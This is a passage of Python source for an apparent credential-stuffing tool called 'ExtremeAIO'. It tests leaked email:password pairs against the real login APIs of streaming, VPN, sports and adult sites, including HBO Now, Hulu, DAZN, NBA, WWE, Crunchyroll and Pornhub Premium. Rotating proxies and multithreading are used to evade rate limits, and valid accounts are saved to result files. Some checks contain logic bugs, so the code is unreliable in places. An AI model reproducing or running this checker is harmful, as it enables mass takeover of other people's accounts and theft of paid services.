            elif "Please fill out the reCAPTCHA" in r.text:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass

# Porn

def PornPORTAL_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            hd= {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma":"no-cache", 
                "Accept":"*/*", 
                "Host":"de.pornhubpremium.com", 
                "Origin":"https://de.pornhubpremium.com", 
                "Referer":"https://de.pornhubpremium.com/premium/login", 
            }
            f = sess.get("https://de.pornhubpremium.com/premium/login", headers=hd)

            csrf = search(r'ue=\"(.*?)\" />', str(f.text)).group(1)

            content = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straigh".format(username, password, csrf) 

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*", 
                "Host":"de.pornhubpremium.com", 
                "Origin":"https://de.pornhubpremium.com", 
                "Referer":"https://de.pornhubpremium.com/premium/login", 
            }

            r = sess.post("https://de.pornhubpremium.com/front/authenticate", headers=headers, data=content)

            if "success\":\"1\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Referer":"https://de.pornhubpremium.com/user/security" 
                }

                x = sess.get("https://de.pornhubpremium.com/user/manage/start", headers=headers)

                ssa = search(r'data: \'(.*?)\'', str(x.text)).group(1)
                next_billing = search(r'Next Billing Date (.*?)</date></', str(x.text)).group(1)

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                c = sess.get("https://ppp.contentdef.com/ui/render?data={}".format(ssa), headers=headers)
                portal = search(r'<i class=\"pp-sub-menu-ico arrow\"></i>(.*?)<', str(x.text)).group(1)
            elif "success\":\"0\"" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))         
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
    except Exception:
        errors+=1
        pass

def PornPORTAL():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Brazzers_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def XVPN_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",  
                "Pragma":"no-cache",  
                "Accept":"*/*",  
                "authority":"xvpn.io",  
                "method":"POST", 
                "path":"/?n=best.free.xvpn.LoginAction", 
                "scheme":"https",  
                "origin":"https://xvpn.io",  
                "referer":"https://xvpn.io/",  
                "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",  
                "x-requested-with":"XMLHttpRequest" 
            }
            content = "Username={}&Password={}".format(username, password) 
            r = sess.post("https://xvpn.io/?n=best.free.xvpn.LoginAction", headers=headers, data=content)
            if "{\"type\":\"redirect\",\"msg\":\"\",\"url\":\"/?n=best.free.xvpn.AccountPage\"}"  in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "This email doesn't exist, try another?" or "The password is incorrect" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass

def XVPN():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=XVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def RealityKings():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=RealityKings_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def RealityKings_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            hd= {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma":"no-cache", 
                "Accept":"*/*", 
                "Host":"de.pornhubpremium.com", 
                "Origin":"https://de.pornhubpremium.com", 
                "Referer":"https://de.pornhubpremium.com/premium/login", 
            }
            f = sess.get("https://de.pornhubpremium.com/premium/login", headers=hd)

            csrf = search(r'ue=\"(.*?)\" />', str(f.text)).group(1)

            content = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straigh".format(username, password, csrf) 

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*", 
                "Host":"de.pornhubpremium.com", 
                "Origin":"https://de.pornhubpremium.com", 
                "Referer":"https://de.pornhubpremium.com/premium/login", 
            }

            r = sess.post("https://de.pornhubpremium.com/front/authenticate", headers=headers, data=content)

            if "success\":\"1\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Referer":"https://de.pornhubpremium.com/user/security" 
                }

                x = sess.get("https://de.pornhubpremium.com/user/manage/start", headers=headers)

                ssa = search(r'data: \'(.*?)\'', str(x.text)).group(1)
                next_billing = search(r'Next Billing Date (.*?)</date></', str(x.text)).group(1)

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                c = sess.get("https://ppp.contentdef.com/ui/render?data={}".format(ssa), headers=headers)
                portal = search(r'<i class=\"pp-sub-menu-ico arrow\"></i>(.*?)<', str(x.text)).group(1)
            elif "success\":\"0\"" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))            
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))   


    except Exception:
        errors+=1
        pass


                
def DAZN_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = {"Email":f"{username}","Password":f"{password}","DeviceId":"0049A8939B","Platform":"web"}

            headers = {
                "Content-Type":"application/json",
                "Pragma":"no-cache", 
                "Accept":"*/*", 
                "origin":"https://www.dazn.com", 
                "referer":"https://www.dazn.com/de-DE/account/signin", 
                "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72" 
            }
            r = sess.post("https://isl-eu.dazn.com/misl/eu/v5/SignIn", headers=headers, json=content)

            if "{\"odata.error\":{\"code\":10049,\"message\":{\"lang\":\"en-US\",\"value\":\"InvalidPassword\"}}}" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "{\"Result\":\"SignedIn" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "Request limiting policy has been breached"  in r.text:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))            




    except Exception:
        errors+=1
        pass

def DAZN():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=DAZN_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1

def Hulu_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={}".format(password, username) 

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }

            r = sess.post("https://auth.hulu.com/v1/device/password/authenticate", data=content, headers=headers)

            if "user_token" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            elif "Your login is invalid. Please try again.\"" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))     



    except Exception:
        errors+=1
        pass



def HBONow_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "Content-Type":"application/json", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",  
                "Pragma":"no-cache",  
                "Accept":"application/vnd.hbo.v9.full+json",  
                "Host":"comet.api.hbo.com",  
                "Connection":"keep-alive",  
                "Content-Length":"295",  
                "X-B3-TraceId":"e99addde-22b3-40f8-9688-ac274b615cf1-b2cfdcbc-736b-4e1e-fe57-f9144807c294",  
                "Accept-Language":"en-us",  
                "X-Hbo-Client-Version":"Hadron/15.1.0.7 desktop (DESKTOP)",  
                "Referer":"https://play.hbonow.com/" 
            }

            content = {"client_id":"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a","client_secret":"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a","scope":"browse video_playback_free","grant_type":"client_credentials","deviceSerialNumber":"27ea8f9a-c987-44d7-bb3e-6c4d741f0b09","clientDeviceData":{"paymentProviderCode":"blackmarket"}}

            f = sess.post("https://comet.api.hbo.com/tokens", headers=headers, json=content)

            token = search(r'"access_token"":""(.*?)"', str(f.text)).group(1)

            content = {"grant_type":"user_name_password","scope":"browse video_playback device elevated_account_management","username":f"{username}","password":f"{password}"}

            headers = {
                "Content-Type":"application/json",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", 
                "Pragma":"no-cache", 
                "Accept":"application/vnd.hbo.v9.full+json", 
                "Host":"comet.api.hbo.com", 
                "Connection":"keep-alive", 
                "Content-Length":"161", 
                "X-B3-TraceId":"e99addde-22b3-40f8-9688-ac274b615cf1-9948e55f-f414-4a17-de05-50701037cbab", 
                "Accept-Language":"en-us", 
                "X-Hbo-Client-Version":"Hadron/15.1.0.7 desktop (DESKTOP)", 
                "Referer":"https://play.hbonow.com/", 
                "Authorization":f"Bearer {token}" 
            }

            r = sess.post("https://comet.api.hbo.com/tokens", headers=headers, json=content)

            if "invalid_credentials" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "access_token" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))



    except Exception:
        errors+=1
        pass

def HBONow():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=HBONow_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1

def NBA_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = {"principal":username,"credential":password,"identityType":"EMAIL","apps":["responsys","billing","preferences"]}

            headers = {
                "Content-Type":"application/json", 
                "Host":"audience.nba.com", 
                "Connection":"keep-alive" ,
                "Content-Length":"132" ,
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", 
                "Content-type":"application/json" ,
                "Accept":"*/*" ,
                "Origin":"https://www.nba.com" ,
                "Sec-Fetch-Site":"same-site" ,
                "Sec-Fetch-Mode":"cors" ,
                "Sec-Fetch-Dest":"empty" ,
                "Referer":"https://www.nba.com/membership/user/login/" ,
                "Accept-Encoding":"gzip, deflate, br" ,
                "Accept-Language":"en-US,en;q=0.9" 
            }

            r = sess.post("https://audience.nba.com/core/api/1/user/login", headers=headers, json=content)

            if "User credentials are invalid" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            elif "responsys.manage" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            else:

                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))          



    except Exception:
        errors+=1
        pass

def NBA():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=NBA_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1

def WWE_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "Content-Type":"application/json", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"application/json", 
                "Origin":"https://watch.wwe.com", 
                "Realm":"dce.wwe", 
                "Referer":"https://watch.wwe.com/signin", 
                "Sec-Fetch-Mode":"cors", 
                "x-api-key":"cca51ea0-7837-40df-a055-75eb6347b2e7" 
            }

            content = {"id":username,"secret":password}

            r = sess.post("https://dce-frontoffice.imggaming.com/api/v2/login", headers=headers, json=content)

            if "failedAuthenticatio" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "{\"authorisationToken\":\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))            



    except Exception:
        errors+=1
        pass

def WWE():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=WWE_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1

def Funimation_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "content-type":"application/json", 
                "Host":"prod-api-funimationnow.dadcdigital.com", 
                "Content-Type":"application/json", 
                "Connection":"keep-alive", 
                "Accept":"*/*", 
                "User-Agent":"Funimation/314 CFNetwork/1121.2.2 Darwin/19.3.0", 
                "Content-Length":"58", 
                "Accept-Language":"en-us", 
                "Accept-Encoding":"gzip, deflate, br" 
            }

            content = {"email":username,"password":password}

            r = sess.post("https://prod-api-funimationnow.dadcdigital.com/api/auth/login/" ,data=content, headers=headers)

            print(r.text)
            if"{\"token\":\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))  
                open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "Request unsuccessful." in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
                
            elif "basic" or "free" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
                open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))            



    except Exception:
        errors+=1
        pass

def Funimation():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Funimation_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1

def Crunchyroll_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = "locale=enUS&device_id=2774e3b7-79ff-4555-b6f2-c69866198b83&device_type=com.crunchyroll.crunchyroid&access_token=WveH9VkPLrXvuNm&version=457" 

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "X-Android-Application-Version-Name":"2.6.0", 
                "X-Android-Device-Manufacturer":"samsung", 
                "X-Android-SDK":"22", 
                "Using-Brightcove-Player":"1", 
                "X-Android-Application-Version-Code":"457", 
                "X-Android-Release":"5.1.1", 
                "X-Android-Device-Product":"greatlteks", 
                "X-Android-Device-Model":"SM-G960F", 
                "X-Android-Device-Is-GoogleTV":"0", 
                "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G960F Build/NMF26X)" 
            }

            f = sess.post("https://api.crunchyroll.com/start_session.1.json", headers=headers, data=content)

            token = search(r'\"session_id\"":"\"(.*?)\"', str(f.text)).group(1)

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "X-Android-Application-Version-Name":"2.6.0", 
                "X-Android-Device-Manufacturer":"samsung", 
                "X-Android-SDK":"22", 
                "Using-Brightcove-Player":"1", 
                "X-Android-Application-Version-Code":"457", 
                "X-Android-Release":"5.1.1", 
                "X-Android-Device-Product":"greatlteks", 
                "X-Android-Device-Model":"SM-G960F", 
                "X-Android-Device-Is-GoogleTV":"0", 
                "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G960F Build/NMF26X)" 
            }
            content = "account={}&password={}&locale=enUS&session_id={}".format(username, password, token)

            r = sess.post("https://api.crunchyroll.com/login.2.json", headers=headers, data=content)

            if "Incorrect login information." or "Your account has been locked." or "not found.\"}" or "internal_server_error" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
            elif "user\",\"user_id" in r.text:
                print("premium")
                plan = search(r'access_type\":\"(.*?)\"', str(r.text)).group(1)
                subscribtion = search(r'premium\":\"(.*?)\"', str(r.text)).group(1)
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/premium.txt".format(today), "a+").write("{}:{} | Subscribtion Type: {} | Plan: {}\n".format(email, password, subscribtion, plan))   
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            elif "\"premium\":\"\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))   
                open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))    
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))         



    except Exception:
        errors+=1
        pass

def Crunchyroll():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
